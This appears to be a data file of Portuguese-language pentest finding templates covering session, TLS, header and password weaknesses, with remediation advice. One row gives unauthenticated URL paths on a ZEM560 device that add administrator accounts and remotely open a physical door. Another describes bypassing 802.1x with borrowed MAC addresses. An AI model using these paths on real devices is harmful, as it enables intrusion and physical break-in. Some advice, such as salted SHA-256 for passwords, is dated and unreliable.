+V;;;Cookie - Ausência do atributo Secure;"O atributo Secure especifica que os cookies serão enviados apenas se a conexão for pelo protocolo HTTPS.A falta deste atributo permite que o identificador de sessão seja enviado por um canal sem criptografia, possibilitando sua captura e, consequentemente, a personificação da sessão de usuários válidos.";-;Cookie - Ausência do atributo Secure;"Deve-se implementar os seguintes controles:1. Habilitar o atributo Secure nos cookies 2. Habilitar no servidor web:• ""X-Frame-Options: SAMEORIGIN”;• ""X-XSS-Protection: 1; mode=block""3. Implementar certificado digital válido com a flag HSTSImplementações:ASP.NETSet the following in Web.config: <httpCookies requireSSL=""true"" />PHPthe flag is set either permanently in php.ini through the parameter: session.cookie_secure = TrueJAVAEEthis can be done by applying the following configuration in web.xml:<session-config> <cookie-config> <secure>true</secure> </cookie-config></session-config>";Gerenciamento de sessão;;OWASP - A6 – Security Misconfiguration;Baixo;;https://www.owasp.org/index.php/SecureFlag;;;;;;;;;;;;;;;
+V;;;Cross-Site Flashing;O servidor web contém um arquivo crossdomain.xml com diretivas que permitem interação com scripts externos do Adobe Flash (SWF).;-;Cross-Site Flashing;"Deve-se adicionar ao arquivo crossdomain.xml , somente os domínios confiáveis, qualquer outra entrada deve ser removida.Exemplo:<cross-domain-policy><site-control permitted-cross-domain-policies=""by-content-type""/><allow-access-from domain=""*.site1.com"" /><allow-access-from domain=""*.site2.com"" />...</cross-domain-policy>";Gerenciamento de Configuração;;OWASP - A7 – Cross-site Scripting (XSS);-;;https://www.adobe.com/devnet/flashplayer/articles/cross_domain_policy.html;;;;;;;;;;;;;;;
+V;;;Dispositivo DVR vulnerável;O dispositivo está vulnerável a LFD (Local File disclousure). Essa vulnerabilidade torna possível a leitura de arquivos locais do dispositivo. O usuário mal-intencionado pode fazer uso dessa vulnerabilidade para ler o arquivo de senhas do dispositivo e logo em seguida acessar o mesmo com as credenciais roubadas.;-;Dispositivo DVR vulnerável;"Deve-se implementar as seguintes recomendações:•        Desativar acesso via telnet;•        Desativar acesso a interface web ou restringir acesso ao mesmo;•        Utilizar política de senha forte no acesso remoto;•        Atualizar o firmware do equipamento.";Gerenciamento de Configuração;;;;;;;;;;;;;;;;;;;;
+V;;;Dispositivo ZEM560 vulnerável;"O dispositivo possui vulnerabilidades conhecidas que permite:•	Acessar a interface de administração do dispositivo, sem uma credencial válida•	Criar outras contas de usuários com poderes administrativos através do link http://IP/csl/user?action=add•	Abrir a porta física da empesa de forma remota, através do link http://IP/form/Device?act=9•	Gerar relatórios dos usuários existentes através do link http:/IP/csl/user";-;Dispositivo ZEM560 vulnerável;"O Fabricante não forneceu atualização de segurança para essa vulnerabilidade. Sendo assim as opções para mitigar a mesma são: •	Isolar o dispositivo numa rede sem comunicação com a rede de operações; ou•	Trocar o dispositivo.";Gerenciamento de Configuração;;;;;https://blog.zerial.org/seguridad/vulnerar-la-seguridad-fisica-de-un-control-de-acceso-biometrico/;;;;;;;;;;;;;;;
+V;;;Headers - HTTP Strict Transport Security (HSTS) não está habilitado;"O servidor não possui o atributo HTTP Strict Transport Security (HSTS), que é um controle de segurança implementado no servidor web e também nos browsers (Chrome, Firefox, Internet Explorer, etc), onde sua funcionalidade consiste em uma flag (Strict-Transport-Security) configurada no header do vhost do servidor web e com um certificado válido reconhecido pelos navegadores, forçando que cada requisição enviada pelo navegador utilize o protocolo TLS. Após implementado este controle:•        O navegador impedirá que qualquer comunicação entre o servidor e o cliente seja enviada por HTTP, somente via HTTPS; •        Ataques man-in-the-middle não serão possíveis, pois o browser (cliente) não permitirá o uso de um certificado inválido.";-;Headers - HTTP Strict Transport Security (HSTS) não está habilitado;"Deve-se aplicar as seguintes práticas de segurança1 - Utilizar um certificado digital de uma CA pública2 - Habilitar o cabeçalho Strict Transport Security (HSTS) no vhost IISAdicione as seguintes linhas no arquivo web.config<?xml version=""1.0"" encoding=""UTF-8""?><configuration>  <system.webServer>    <httpProtocol>      <customHeaders>        <add name=""Strict-Transport-Security"" value=""max-age=31536000"" />      </customHeaders>    </httpProtocol>  </system.webServer></configuration>    ApacheAdicione a seguinte linha no arquivo de configuraçãoHeader add Strict-Transport-Security ""max-age=15768000""Nginx Adicione a seguinte linha no arquivo de configuraçãoadd_header Strict-Transport-Security ""max-age=15768000"";";Gerenciamento de Configuração;;OWASP - A6 – Security Misconfiguration;-;https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.md;;;;;;;;;;;;;;;;
+V;;;Headers - X-Frame-Options não está habilitado;Este controle de segurança evita que atques como por exemplo: clickjacking e xss sejam explorado na aplicação;-;Headers - X-Frame-Options não está habilitado;Deve-se ativar o cabeçalho X-Frame-Options no servidor web;Gerenciamento de configuração;;;;;https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#tab=Headers;;;;;;;;;;;;;;;
+V;;;Identificação de versão de serviços e tecnologias no cabeçalho HTTP;Foi identificado as tecnologias e versões adotadas pelo servidor por meio do cabeçalho das respostas HTTP recebidas. A divulgação dessas informações facilita a busca por vulnerabilidades especificas, que podem ocasionar uma eventual exploração.;A aplicação não exibe as informações de versão ao utilizar os métodos HTTP GET e POST, porém ao utilizar o método OPTIONS ou através da tentativa de acesso à outra aplicação hospedada no mesmo servidor, informações de versão do servidor Web e frameworks são exibidas.;Identificação de versão de serviços e tecnologias no cabeçalho HTTP;Recomenda-se remover essas informações do cabeçalho HTTP a fim de evitar ou dificultar a identificação dessas informações.;Gerenciamento de Configuração;;;INFORMATIVE;;;;;;;;;;;;;;;;;
+V;;;Métodos HTTP inseguros;Recomenda-se manter habilitado apenas os métodos HEAD, GET e POST, os demais métodos devem ser desabilitados, porém caso seja necessário o uso de algum outro método não definido acima, o acesso ao mesmo deve ser restrito.;-;Métodos HTTP inseguros;"Recomenda-se manter habilitado apenas os métodos HEAD, GET e POST, os demais métodos devem ser desabilitados, porém caso seja necessário o uso de algum outro método não definido acima, o acesso ao mesmo deve ser restrito.Não se deve utilizar ou permitir métodos que são considerados inseguros:	•	PUT;•	DELETE;•	TRACE;	•	CONNECT;•	OPTIONS.Descrições:•	OPTIONS: Representa uma solicitação de informações sobre as opções de comunicação disponíveis na cadeia de solicitação / resposta identificadas pelo Request-URI;•	TRACE: método HTTP que permite analisar como a aplicação se comporta ao receber determinadas requisições. Usuários mal-intencionados podem utilizar essa informação para identificar se a requisição está sendo manipulada por um firewall, por exemplo, ou analisar o comportamento da aplicação;•	Em caso de outras aplicações, os métodos PUT, DELETE, CONNECT podem permitir o cliente a adicionar e remover arquivos no servidor web, utilizá-lo como um proxy e executar ataques de Cross-Site Tracing (XST), respectivamente;•	Os métodos PUT e DELETE, com os devidos controles de segurança, podem ser utilizados em aplicações com REST.";Gerenciamento de Configuração;Desabilitar métodos HTTP inseguros;;LOW;;;;;;;;;;;;;;;;;
+V;;;NGINX com vulnerabilidades conhecidas;Vulnerabilidades foram encontradas na implementação do HTTP/2 que podem causar o consumo excessivo de memória e de uso de CPU. Essa vulnerabilidade afeta todas as versões entre 1.9.5 e 1.15.4.;-;NGINX com vulnerabilidades conhecidas;Para mitigar essa vulnerabilidade deve-se atualizar o NGINX.;Gerenciamento de Configuração;;;;;http://mailman.nginx.org/pipermail/nginx-announce/2018/000220.html;;;;;;;;;;;;;;;
+V;;;O ativo está acessível através de credencial padrão;O ativo está acessível por meio das credenciais padrão do fabricante. Um usuário mal-intencionado ao obter acesso a console administrativa teria acesso às configurações da aplicação, permitindo a alteração de parâmetros e/ ou serviços.;-;O ativo está acessível através de credencial padrão;"Deve se implementar os seguintes controles de segurança:1. Troca imediata da senha default do fabricante; 2. Restringir remoto somente IPs autorizados.";Gerenciamento de Configuração;;;;;;;;;;;;;;;;;;;;
+V;;;Serviços e módulos com versão desatualizada;Foram detectados serviços e módulos que estão em funcionamento com a versão desatualizada, que permite a exploração de vulnerabilidades no serviço e conseqüentemente comprometimento do servidor e informações nele armazenadas.;-;Serviços e módulos com versão desatualizada;Deve-se atualizar o software para a última versão e aplicar as atualizações existentes, conforme o site do fornecedor.;Gerenciamento de Configuração;;;MEDIUM;;;;;;;;;;;;;;;;;
+V;;;Serviços e módulos com versão descontinuada;Foram detectados serviços e módulos que estão em funcionamento com a versão desatualizada, que permite a exploração de vulnerabilidades no serviço e conseqüentemente comprometimento do servidor e informações nele armazenadas.;-;Serviços e módulos com versão descontinuada;"Recomenda-se aplicar uma destas recomendações1. Trocar a versão do serviço utilizado, para a mais recente fornecida pelo fornecedor;2. Restringir o acesso ao serviço através de segmentação de rede, com um firewall que filtre o conteúdo que é direcionado ao mesmo, garantindo que as vulnerabilidades existentes não serão exploradas e esse risco estará sobre controle.";Gerenciamento de Configuração;;;;;;;;;;;;;;;;;;;;
+V;;;O serviço Web está expondo informações sensíveis por meio do arquivo robots.txt;O arquivo robots.txt, utilizado por sites de busca na indexação de conteúdos, contém informações que ajudam a identificação de diretórios que possam conter conteúdos sensíveis.;-;O serviço Web está expondo informações sensíveis por meio do arquivo robots.txt;Revisar o conteúdo do arquivo robots.txt, localizado na raiz do diretório de publicação. O arquivo deve conter somente os recursos disponibilizados publicamente.;Gerenciamento de Configuração;;;INFORMATIVE;;;;;;;;;;;;;;;;;
+V;;;Bypass do protocolo 802.1x;"O protocolo 802.1x é utilizado para controle de acesso de redes, provendo mecanismos de autenticação para dispositivos que desejam acessar a rede LAN ou WLAN.Usuários mal-intencionados com acesso físico ao ambiente podem explorar dispositivos que não oferecem suporte ao protocolo 802.1x ou não estão configurados de forma segura (impressoras e telefones IP, por exemplo) para obter acesso à rede, utilizando as portas e endereço MAC de tais equipamentos. Uma vez realizado o bypass do protocolo 802.1x e com acesso à rede, tais usuários mal-intencionados podem ter acesso ao ambiente corporativo.";-;Bypass do protocolo 802.1x;"Como forma de recomendação para correção da vulnerabilidades, é importante que a empresa implemente:•        Controle de acesso físico ao ambiente, permitindo a entrada somente de pessoas autorizadas;•        Segmentação da rede de voz em relação à rede de dados (VLANs);•        Para impressoras e outros dispositivos sem suporte ao protocolo 802.1x, utilizar um firewall para garantir que em caso de algum tipo de acesso, a comunicação fique restrita somente aos serviços necessário dentro daquele escopo de rede;•        Bloquear o acesso do usuário as configurações no telefone IP (Desabilitar o acesso ao Settings Access dentro do CUCM);•        Retirar a etiqueta no telefone IP, onde possui o endereço MAC, pois caso essa informação seja coletada, é possível realizar o bypass do protocolo 802.1x;•        Em caso do dispositivo oferecer suporte, configurar os mesmos para que utilizem o protocolo 802.1x para acesso seguro à rede;•        Monitorar tráfego na VLAN de voz, para identificar ações maliciosas";Gerenciamento de Criptografia;;;;;;;;;;;;;;;;;;;;
+V;;;Cifras fracas habilitadas (SSL/TLS);O principal benefício da segurança da camada de transporte é a proteção dos dados de aplicações web contra divulgação e modificação não autorizadas quando são transmitidos entre clientes (navegadores) e o servidor da aplicação e entre o servidor e o back-end e outros componentes corporativos. Com base nisso cifras seguras devem ser implementadas para garantir a segurança nessa comunicação.;-;Cifras fracas habilitadas (SSL/TLS);"Desabilitar o uso de todas as versões do SSL, assim como o TLSLv1.0 e TLSv1.1Com relação ao TLSv1.2 recomenda-se desabilitar as cifras fracas e/ou com vulnerabilidades conhecidas.";Gerenciamento de Criptografia;;OWASP - A6 – Security Misconfiguration;-;;https://httpd.apache.org/docs/trunk/en/ssl/ssl_howto.html;https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/;;;;;;;;;;;;;;
+V;;Suíte de Cifras Fracas;O servidor está utilizando chaves criptográficas inadequadas para o protocolo SSL/TLS.;"O servidor está permitindo o estabelecimento de conexões utilizando chaves criptográficas vulneráveis. Essa situação permite que um usuário mal-intencionado execute ataques de man-in-the-middle ou decifre a comunicação entre um cliente e o servidor.O browser do cliente define um processo para estabelecer a conexão segura com o servidor, após este “anunciar” os algoritmos e cifras suportadas. No entanto, é possível forçar o uso de um algoritmo de criptografia fraco, caso solicitado pelo cliente.";-;O servidor está utilizando chaves criptográficas inadequadas para o protocolo SSL/TLS.;"Recomenda-se a configuração da biblioteca de criptografia de modo a utilizar somente conjunto de cifras fortes, assim como desabilite todas as demais cifras.No servidor web IIS, pode-se utilizar a ferramenta IIS Crypto https://www.nartac.com/Products/IISCryptoPara os servidores abaixo é possível utilizar esta ferramenta do Mozilla Security - https://mozilla.github.io/server-side-tls/ssl-config-generator• Apache • Nginx • Lighttpd • HAProxy • AWS ELB";Gerenciamento de Criptografia;Suites de cifras frotes;;LOW;;;;;;;;;;;;;;;;;
+V;;Suíte de Cifras Fracas;Suíte de Cifras Fracas;"O servidor está permitindo o estabelecimento de conexões utilizando chaves criptográficas vulneráveis. Essa situação permite que um usuário mal-intencionado execute ataques de man-in-the-middle ou decifre a comunicação entre um cliente e o servidor.O browser do cliente define um processo para estabelecer a conexão segura com o servidor, após este “anunciar” os algoritmos e cifras suportadas. No entanto, é possível forçar o uso de um algoritmo de criptografia fraco, caso solicitado pelo cliente.";-;Suíte de Cifras Fracas;"Recomenda-se a configuração da biblioteca de criptografia de modo a utilizar somente conjunto de cifras fortes, assim como desabilite todas as demais cifras.No servidor web IIS, pode-se utilizar a ferramenta IIS Crypto https://www.nartac.com/Products/IISCryptoPara os servidores abaixo é possível utilizar esta ferramenta do Mozilla Security - https://mozilla.github.io/server-side-tls/ssl-config-generator• Apache • Nginx • Lighttpd • HAProxy • AWS ELB";Gerenciamento de Criptografia;Suites de cifras frotes;;LOW;;;;;;;;;;;;;;;;;
+;;;Erro SSL - Certificado Auto-Assinado;Foi detectado que o servidor está auto-assinando o certificado. Este procedimento não garante para o cliente a confiabilidade da assinatura e autenticidade da origem. Desta forma um usuário mal-intencionado poderia clonar o certificado ou criar um próprio e utilizá-lo em um Replay Attack para personificar a identidade do verdadeiro servidor.<br/><br/><br/><br/>Na presente situação não há garantia que o certificado é confiável, apenas indica que é um certificado gerado por um servidor.;-;Erro SSL - Certificado Auto-Assinado;Deve ser utilizado um certificado digital emitido por uma autoridade certificadora (CA) reconhecida internacionalmente.;Gerenciamento de Criptografia;;;LOW;;;;;;;;;;;;;;;;;
+;;;Erro SSL - Certificado emitido por outro servidor;Foi identificado que o certificado digital está sendo emitido por um servidor que não é o utilizado pela própria aplicação.<br/><br/>Está situação fere os princípios de confiabilidade e autenticidade do servidor de aplicação.;-;Erro SSL - Certificado emitido por outro servidor;O certificado digital deve ser emitido pelo servidor de aplicação.;Gerenciamento de Criptografia;;;LOW;;;;;;;;;;;;;;;;;
+;;;Erro SSL - Certificado Expirado;"Foi identificado que o certificado digital utilizado pela aplicação foi expirado. Essa situação causa a falta de confiabilidade entre a aplicação e os clientes e acarreta na diminuição da credibilidade da empresa, pois quando um cliente vir a acessar a aplicação Web, lhe será exibido uma mensagem de que ""o presente site não é seguro"". Isso gerará desconfiança por parte dos clientes, podendo levar a diminuição de acesso a aplicação.";-;Erro SSL - Certificado Expirado;Deve-se renovar a validade do certificado digital junto a autoridade certificadora do antigo certificado.;Gerenciamento de Criptografia;;;LOW;;;;;;;;;;;;;;;;;
+;;;O servidor está utilizando uma versão de OpenSSL que possui falhas de segurança.;O certificado SSL utilizado pelo serviço em questão possui conhecidas falhas de segurança, devido sua versão estar desatualizada.;-;O servidor está utilizando uma versão de OpenSSL que possui falhas de segurança.;Desativar o SSLv2 e SSLv3.<br/><br/>Habilitar o TLS1.2<br/><br/><br/><br/>No Windows:<br/><br/>Aplicar os patchs de correção: <br/><br/>MS12-006 - http://technet.microsoft.com/en-us/security/bulletin/ms12-006<br/><br/>MS13-006 - http://technet.microsoft.com/en-us/security/bulletin/ms13-006<br/><br/>O fabricante também disponibilizou alguns procedimentos para eventuais problemas após a instalação do patch de correção em http://support.microsoft.com/kb/2643584<br/><br/><br/><br/>No Linux<br/><br/>Atualizar o OpenSSL para a versão 1.0.2d, 1.0.0p ou superior..<br/><br/>ou<br/><br/>Edite o arquivo /etc/httpd/conf.d/ssl.conf<br/><br/>Insira o parâmetro SSLInsecureRenegotiation off<br/><br/>Reinicie o Apache service httpd restart;Gerenciamento de Criptografia;;;LOW;;;;;;;;;;;;;;;;;
+;;;TLS 1.0 Enabled;"O servidor da Web suporta criptografia por meio do TLS 1.0, que não é considerado ""criptografia robusta"" e possui vulnerabilidades.";-;;;Gerenciamento de Criptografia;;;;;;;;;;;;;;;;;;;;
+V;;;Acesso anônimo a arquivos da aplicação;A aplicação permite o acesso à documentos internos sem a necessidade de autenticação de um usuário válido. Dessa forma, usuários mal-intencionados podem visualizar documentos contendo informações pessoais e sigilosas de clientes e pacientes;-;Acesso anônimo a arquivos da aplicação;Deve ser validado as credenciais e/ou sessões ativas para todas as solicitações de acesso a páginas restritas ao servidor de aplicação. Esta validação deve verificar a existência de credenciais e cookies de sessão no processo de solicitação da página requerente, se a mesma é válida e caso seja, deve ser concedido os privilégios necessários aquele determinado perfil de usuário.;Gerenciamento de sessão;;;HIGH;;;;;;;;;;;;;;;;;
+V;;;Conexões simultâneas;"A aplicação permite a abertura de duas sessões utilizando a mesma credencial partindo de computadores distintos, simultaneamente.Essa situação fere o princípio do não-repúdio e dificulta a rastreabilidade das ações maliciosas no sistema, na situação de dois usuários autenticarem na aplicação com a mesma credencial e um deles realizar alguma ação maliciosa no sistema.";-;Conexões simultâneas;"Os cookies devem seguir os seguintes requisitos:•	A geração do cookie deve utilizar algoritmos conhecidos, padronizados e bem testados, que garantam a aleatoriedade dos identificadores de sessão para evitar que um usuário mal-intencionado descubra-os através de predição lógica/matemática;•	Ao fim de uma sessão ou após 30 minutos de inatividade o SESSIONID deve ser destruído de forma a não poder mais ser utilizado;•	Sempre que o usuário executar a autenticação, um novo cookie de sessão deve ser enviado, retirando o cookie antigo (que o usuário possuía antes de executar a autenticação);•	O SESSIONID deve estar atrelado a informações provindas do cliente que realizou o acesso, tais como, IP de origem, User-agent e geo-localização;•	No caso de um SESSIONID ser utilizado de um cliente cujas informações são diferentes às armazenadas na criação do SESSIONID, a sessão e o SESSIONID deverão ser destruídos e uma nova autenticação deve ser realizada.O cookie de sessão não deve ser:•	Trafegado na URL (GET);•	Escondido em campos HIDDEN do formulário HTML;•	Expostos em mensagens de erro e logs..Esconder cookies de sessão ou trafega-los na URL pode permitir vetores para o vazamento facilitado do controlador de sessão.A previsibilidade do cookie de sessão pode permitir a obtenção de sessões válidas no sistema por meio de agentes não autorizados.Permitir sessões persistentes (que não expiram) aumenta o tempo para a execução de ataques.Não alterar o cookie durante a autenticação permite que sejam estabelecidos ataques de fixação de sessão.";Gerenciamento de sessão;;;LOW;;;;;;;;;;;;;;;;;
+V;;ROUBO DE SESSÃO;Roubo de Sessão;"O roubo de sessão consiste em acessar páginas restritas da aplicação, utilizando o cookie de sessão de um usuário legítimo e ativo no sistema, sem necessidade de credenciais válidas a partir de um computador distinto.Ao forçar a utilização de uma sessão ativa (SESSIONID), foi possível personificar o usuário relativo à sessão e acessar páginas restritas na aplicação.Esta situação coloca em risco a integridade do sistema e fere os princípios do não-repúdio e da rastreabilidade de ações.";-;Roubo de Sessão;"Os cookies devem seguir os seguintes requisitos:•	A geração do cookie deve utilizar algoritmos conhecidos, padronizados e bem testados, que garantam a aleatoriedade dos identificadores de sessão para evitar que um usuário mal-intencionado descubra-os através de predição lógica/matemática;•	Ao fim de uma sessão ou após 30 minutos de inatividade o SESSIONID deve ser destruído de forma a não poder mais ser utilizado;•	Sempre que o usuário executar a autenticação, um novo cookie de sessão deve ser enviado, retirando o cookie antigo (que o usuário possuía antes de executar a autenticação);•	O SESSIONID deve estar atrelado a informações provindas do cliente que realizou o acesso, tais como, IP de origem, User-agent e geo-localização;•	No caso de um SESSIONID ser utilizado de um cliente cujas informações são diferentes às armazenadas na criação do SESSIONID, a sessão e o SESSIONID deverão ser destruídos e uma nova autenticação deve ser realizada.O cookie de sessão não deve ser:•	Trafegado na URL (GET);•	Escondido em campos HIDDEN do formulário HTML;•	Expostos em mensagens de erro e logs..Esconder cookies de sessão ou trafega-los na URL pode permitir vetores para o vazamento facilitado do controlador de sessão.A previsibilidade do cookie de sessão pode permitir a obtenção de sessões válidas no sistema por meio de agentes não autorizados.Permitir sessões persistentes (que não expiram) aumenta o tempo para a execução de ataques.Não alterar o cookie durante a autenticação permite que sejam estabelecidos ataques de fixação de sessão.";Gerenciamento de sessão;;;HIGH;;;;;;;;;;;;;;;;;
+V;;ROUBO DE SESSÃO;Sessão Inadequada (Session Fixation);No processo de autenticação do usuário a aplicação faz reuso de um SESSION ID já existente para aquele navegador, os controles de sessão da aplicação não destroem as sessões no momento de logoff ou após um determinado período sem atividade. Esta situação faz com que o identificador do usuário na sessão possa ser comprometido por sniffing de rede ou outros ataques como o XSS, e seja reutilizado por um usuário mal-intencionado. ;-;Sessão Inadequada (Session Fixation);"Os cookies devem seguir os seguintes requisitos:•	A geração do cookie deve utilizar algoritmos conhecidos, padronizados e bem testados, que garantam a aleatoriedade dos identificadores de sessão para evitar que um usuário mal-intencionado descubra-os através de predição lógica/matemática;•	Ao fim de uma sessão ou após 30 minutos de inatividade o SESSIONID deve ser destruído de forma a não poder mais ser utilizado;•	Sempre que o usuário executar a autenticação, um novo cookie de sessão deve ser enviado, retirando o cookie antigo (que o usuário possuía antes de executar a autenticação);•	O SESSIONID deve estar atrelado a informações provindas do cliente que realizou o acesso, tais como, IP de origem, User-agent e geo-localização;•	No caso de um SESSIONID ser utilizado de um cliente cujas informações são diferentes às armazenadas na criação do SESSIONID, a sessão e o SESSIONID deverão ser destruídos e uma nova autenticação deve ser realizada.O cookie de sessão não deve ser:•	Trafegado na URL (GET);•	Escondido em campos HIDDEN do formulário HTML;•	Expostos em mensagens de erro e logs..Esconder cookies de sessão ou trafega-los na URL pode permitir vetores para o vazamento facilitado do controlador de sessão.A previsibilidade do cookie de sessão pode permitir a obtenção de sessões válidas no sistema por meio de agentes não autorizados.Permitir sessões persistentes (que não expiram) aumenta o tempo para a execução de ataques.Não alterar o cookie durante a autenticação permite que sejam estabelecidos ataques de fixação de sessão.";Gerenciamento de sessão;;;HIGH;;;;;;;;;;;;;;;;;
+V;;;Tempo de expiração de sessão;O tempo para expiração da sessão autenticada, que está inativa é maior que 10 minutos. Esta situação pode permitir que a sessão seja interceptada e reutilizada.;-;Tempo de expiração de sessão;"Os cookies devem seguir os seguintes requisitos:•	A geração do cookie deve utilizar algoritmos conhecidos, padronizados e bem testados, que garantam a aleatoriedade dos identificadores de sessão para evitar que um usuário mal-intencionado descubra-os através de predição lógica/matemática;•	Ao fim de uma sessão ou após 30 minutos de inatividade o SESSIONID deve ser destruído de forma a não poder mais ser utilizado;•	Sempre que o usuário executar a autenticação, um novo cookie de sessão deve ser enviado, retirando o cookie antigo (que o usuário possuía antes de executar a autenticação);•	O SESSIONID deve estar atrelado a informações provindas do cliente que realizou o acesso, tais como, IP de origem, User-agent e geo-localização;•	No caso de um SESSIONID ser utilizado de um cliente cujas informações são diferentes às armazenadas na criação do SESSIONID, a sessão e o SESSIONID deverão ser destruídos e uma nova autenticação deve ser realizada.O cookie de sessão não deve ser:•	Trafegado na URL (GET);•	Escondido em campos HIDDEN do formulário HTML;•	Expostos em mensagens de erro e logs..Esconder cookies de sessão ou trafega-los na URL pode permitir vetores para o vazamento facilitado do controlador de sessão.A previsibilidade do cookie de sessão pode permitir a obtenção de sessões válidas no sistema por meio de agentes não autorizados.Permitir sessões persistentes (que não expiram) aumenta o tempo para a execução de ataques.Não alterar o cookie durante a autenticação permite que sejam estabelecidos ataques de fixação de sessão.";Gerenciamento de sessão;;;LOW;;;;;;;;;;;;;;;;;
+V;;;Política de senhas fraca;"Uma senha, ou password, serve para autenticar uma conta, ou seja, é usada no processo de verificação da sua identidade, assegurando que você é realmente quem diz ser e que possui o direito de acessar o recurso em questão. A política de senhas atual é fraca, permitindo a fácil identificação de password de acesso por um usuário mal-intencionado, por meio de ataques de força bruta ou dicionário.";-;Política de senhas fraca;"Definir uma política de senha forte, onde recomenda-se seguir os seguintes requisitos:•	Contenha no mínimo 8 caracteres ou mais;•	Inclua números, símbolos, letras maiúsculas e minúsculas;•	Efetuar a troca periódicas das senhas, recomendado de 90 em 90 dias.NÃO permitir o uso de:•	Senha de fácil dedução (ex: carro2018, jose123, password, pass123, p@55w0rd, P@ssw0rd123);•	Senhas compostas somente com números (ex:12345678);•	Informações pessoais na composição da password (ex: idade e nome, joao1985);•	Senhas antigas;•	Nome do usuário na composição da senha;•	Senhas compostas com Informações relacionadas a empresa (empresa123, empresa2019).Conscientizar os usuários com as seguintes práticas:•	NÃO salvar senhas nos browsers, utilizar um gerenciador de senhas seguro;•	NÃO utilizar e-mail corporativo em sites de terceiros (ex: Linkedin, Facebook, lojas, etc;•	NÃO compartilhar senhas.Práticas seguras: •	Após a criação do usuário/senha o mesmo deve ser enviado para o respectivo responsável, via comunicação segura, se possível sem interação humana; •	Utilize um mecanismo de segundo fator de autenticação (2FA) em todos os sistemas que possuem essa funcionalidade;.";Senha;Política de senhas;;MEDIUM;;;;;;;;;;;;;;;;;
+V;;;Inexistência de função para alteração da senha;"O sistema deve fornecer, na área autenticada, um componente para a troca de senha do usuário.Sendo assim, caso o usuário queira apenas alterar a senha, é necessário solicitar a senha atual e a nova senha duas vezes, então devem haver três campos (senha atual, senha nova e repetir senha nova) para a alteração de senha. Caso os campos de senha nova não sejam iguais, o usuário deve ser informado que a senha não foi alterada pois as senhas não coincidem. Caso a senha atual não coincida realmente com a senha atual, o usuário deve ser informado que a senha está incorreta.";-;Inexistência de função para alteração da senha;"O sistema deve fornecer, na área autenticada, um componente para a troca de senha do usuário.Sendo assim, caso o usuário queira apenas alterar a senha, é necessário solicitar a senha atual e a nova senha duas vezes, então devem haver três campos (senha atual, senha nova e repetir senha nova) para a alteração de senha. Caso os campos de senha nova não sejam iguais, o usuário deve ser informado que a senha não foi alterada pois as senhas não coincidem. Caso a senha atual não coincida realmente com a senha atual, o usuário deve ser informado que a senha está incorreta.";Senha;Alteração de senha;;MEDIUM;;;;;;;;;;;;;;;;;
+V;;;Inexistência de função para recuperação da senha;"Ao solicitar a recuperação de senha, o sistema nunca deverá enviar a senha em texto claro ao usuário.O sistema também não deverá gerar uma senha para o usuário.A funcionalidade de recuperação de senha deve ter as seguintes características:_ Enviar ao e-mail do usuário uma URL com um token alfanumérico gerado de forma aleatória que contém pelo menos 25 caracteres;_ Ser de uso único, ou seja, não permitir a reutilização deste token;_ Possuir tempo limitado de acesso, sendo assim, este token deve expirar e se tornar inválido após algumas horas caso não seja utilizado;_ Após o usuário criar uma senha, um novo e-mail deve ser enviado ao usuário, informando-o que a senha foi alterada com sucesso;_ Caso seja solicitada a recuperação de senha mais de uma vez para o mesmo usuário, somente o token da última recuperação solicitada deve permanecer válido, sendo assim, deve haver apenas um token válido por usuário, os outros devem ser imediatamente expirados e invalidados._ A senha esquecida do usuário só deve ser invalidada caso o usuário execute por completo o procedimento de nova senha.Enviar a senha em texto claro do usuário ao usuário indica que a senha está armazenada de forma incorreta, esta deve ser armazenada apenas o hash do valor gerado, além disso, caso seja gerada uma senha nova pela aplicação, alguns problemas podem aparecer:_ A geração de senha pode ser previsível;_ A senha pode ser capturada caso a caixa do usuário seja comprometida.OBS: A aplicação pode gerar a senha para o usuário, caso o mesmo seja criado de forma randômica e para cada acesso solicitado pelo usuário.";-;Inexistência de função para recuperação da senha;"Ao solicitar a recuperação de senha, o sistema nunca deverá enviar a senha em texto claro ao usuário.O sistema também não deverá gerar uma senha para o usuário.A funcionalidade de recuperação de senha deve ter as seguintes características:_ Enviar ao e-mail do usuário uma URL com um token alfanumérico gerado de forma aleatória que contém pelo menos 25 caracteres;_ Ser de uso único, ou seja, não permitir a reutilização deste token;_ Possuir tempo limitado de acesso, sendo assim, este token deve expirar e se tornar inválido após algumas horas caso não seja utilizado;_ Após o usuário criar uma senha, um novo e-mail deve ser enviado ao usuário, informando-o que a senha foi alterada com sucesso;_ Caso seja solicitada a recuperação de senha mais de uma vez para o mesmo usuário, somente o token da última recuperação solicitada deve permanecer válido, sendo assim, deve haver apenas um token válido por usuário, os outros devem ser imediatamente expirados e invalidados._ A senha esquecida do usuário só deve ser invalidada caso o usuário execute por completo o procedimento de nova senha.Enviar a senha em texto claro do usuário ao usuário indica que a senha está armazenada de forma incorreta, esta deve ser armazenada apenas o hash do valor gerado, além disso, caso seja gerada uma senha nova pela aplicação, alguns problemas podem aparecer:_ A geração de senha pode ser previsível;_ A senha pode ser capturada caso a caixa do usuário seja comprometida.OBS: A aplicação pode gerar a senha para o usuário, caso o mesmo seja criado de forma randômica e para cada acesso solicitado pelo usuário.";Senha;Recuperação da senha;;MEDIUM;;;;;;;;;;;;;;;;;
+V;;;Armazenamento inseguro de senha;"Para armazenamento de senhas na base de dados, é recomendável utilizar algoritmos de hash (SHA-256 ou superior) com a função de SALT, de maneira a dificultar a identificação de senhas caso haja um vazamento ou exposição de base de dados.Em caso de vazamento de dado ou exposição da base, armazenar a senha de maneira correta, com um algoritmo de hash aplicado ao dado, garante que o usuário não tenha sua credencial exposta diretamente, além disso, utilizar o salt dificulta de maneira relevante a identificação da senha do usuário por meio de comparação de hashes. ";-;Armazenamento inseguro de senha;"Para armazenamento de senhas na base de dados, é recomendável utilizar algoritmos de hash (SHA-256 ou superior) com a função de SALT, de maneira a dificultar a identificação de senhas caso haja um vazamento ou exposição de base de dados.Em caso de vazamento de dado ou exposição da base, armazenar a senha de maneira correta, com um algoritmo de hash aplicado ao dado, garante que o usuário não tenha sua credencial exposta diretamente, além disso, utilizar o salt dificulta de maneira relevante a identificação da senha do usuário por meio de comparação de hashes. ";Senha;Armazenamento de senha;;MEDIUM;;https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet;;;;;;;;;;;;;;;
